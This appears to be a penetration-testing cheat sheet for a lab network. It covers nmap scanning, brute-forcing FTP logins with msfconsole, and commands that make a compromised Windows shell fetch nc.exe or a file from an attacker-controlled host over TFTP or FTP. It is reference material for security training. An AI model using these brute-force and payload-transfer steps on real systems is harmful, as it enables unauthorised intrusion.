## Nmap

```bash
# Identify target addresses on network
nmap -sn 10.11.1.1/24

# Scan default 1000 ports
nmap 10.11.1.22

# Scan for service version, default scripts and OS version
nmap -sV -sC -O 10.11.1.22

# Scan all 65535 ports
nmap -p- 10.11.1.22

# Scan for vulnerabilities on specific ports
nmap --script vuln 10.11.1.22 -p 21,80
```
## Port 21 - FTP
```bash
# Identify servers that allow anonymous access
nmap --script ftp-anon.nse 10.11.1.22 -p 21

# Identify any vulnerabilities
nmap --script vuln 10.11.1.22 -p 21

# Brute force with MSFConsole
msfconsole
use auxiliary/scanner/ftp/ftp-login
set PASS_FILE /root/password-file.txt
set USERPASS_FILE /root/users.txt
set RHOSTS <targetip>
run

```

## File Transfers
### TFTP UDP Transfer
```bash
# Create directory to serve files
mkdir /tftp

# Start atftpd daemon and listen on UDP port 69 using /tftp as root
atftpd --daemon --port 69 /tftp

# Copy file to share to host directory
cp /usr/share/windows-binaries/nc.exe /tftp/

# In your reverse/bind shell on the target machine
tftp -i <i>ATTACKINGIP</i> GET nc.exe
```
### FTP File Transfer
```bash
# On attacking machine, setup an ftp server
apt-get install pure-ftpd

# Download and run the following setup file, it will create an ftp user 'bedford'
[setup-ftp](/setup-ftp)

# Change user permissions, run file and set password on request
chmod 755
./setup-ftp

# Copy and paste the following code into your Windows target bind/reverse shell
echo open *ATTACKINGIP* 21> ftp.txt
echo user bedford>> ftp.txt
echo *PASSWORD*>> ftp.txt
echo bin>> ftp.txt
echo GET evilfile.txt>> ftp.txt
echo bye>> ftp.txt

# Now in your Windows bind/reverse shell run the ftp.txt file
ftp -v -n -s:ftp.txt
```
